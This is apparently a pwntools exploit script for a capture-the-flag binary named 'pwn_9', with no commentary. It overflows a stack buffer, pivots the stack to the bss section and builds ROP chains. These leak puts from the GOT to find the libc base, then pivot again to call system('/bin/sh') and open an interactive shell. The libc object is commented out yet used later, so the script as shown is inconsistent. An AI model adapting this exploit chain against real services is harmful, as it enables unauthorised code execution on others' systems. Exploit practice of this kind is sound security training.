#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'
context.terminal='wt.exe bash -c'.split(' ')

io = process("./pwn_9")
elf = ELF("./pwn_9")
# libc = ELF("./libc.so.6")

bss = elf.bss() + 0x100
magic_read = 0x4013AE

payload = b'a'*0x40 + p64(bss+0x40) + p64(magic_read)
gdb.attach(io)
pause(3)
io.send(payload)
sleep(0.1)

pop_rdi_ret = 0x401483
pop_rsi_r15_ret = 0x401481
leave_ret = 0x40136c

payload = p64(pop_rsi_r15_ret) + p64(elf.got['write']) + p64(0) + p64(elf.plt['read']) + p64(pop_rdi_ret) + p64(0x1000) + p64(elf.plt['sleep'])
payload = payload.ljust(0x40, b'\x00') + p64(bss-8) + p64(leave_ret)
io.send(payload)
sleep(0.1)
io.send(p64(magic_read))
sleep(0.1)

payload = b'a'*0x30 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(magic_read)
io.send(payload)
sleep(0.1)

libc_base = u64(io.recvuntil("\x7f")[-6:].ljust(8, b'\x00')) - libc.sym['puts']
success("libc_base:\t" + hex(libc_base))

bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.sym['system']
ret = 0x40101a
pop_rdi_rbp_ret = libc_base + 0x248f2
thread_stack_rop_addr = libc_base - 0x4150

payload = p64(ret) + p64(pop_rdi_rbp_ret) + p64(bin_sh_addr) + p64(0) + p64(system_addr)
payload = payload.ljust(0x40, b'\x00') + p64(thread_stack_rop_addr-8) + p64(leave_ret)
io.send(payload)
io.interactive()